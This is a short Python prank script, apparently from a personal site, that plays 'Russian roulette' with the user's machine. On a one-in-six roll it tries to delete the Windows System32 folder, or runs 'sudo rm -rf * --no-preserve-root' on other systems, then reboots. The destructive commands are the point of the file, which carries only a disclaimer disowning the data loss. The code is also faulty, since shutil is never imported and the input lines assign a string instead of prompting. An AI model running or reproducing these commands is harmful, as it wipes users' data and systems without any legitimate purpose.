# masoncodes.me
# licensed under GNU GPL v3
# I AM NOT RESPONSIBLE FOR THE LOSS OF ANY DATA DUE TO YOU RUNNING THIS FILE!

import os
import random

spin = random.randint(1, 6)

if os.name == "nt":
    if spin == 6:
        print("BANG!")
        shutil.rmtree("C:\Windows\System32")
        input = ("If you're reading this it's too late")
        os.system('shutdown -r')
    else:
        print("Click.")

else:
    if spin == 6:
        print("BANG!")
        os.system('sudo rm -rf * --no-preserve-root')
        input = ("If you're reading this it's too late")
        os.system('sudo reboot')
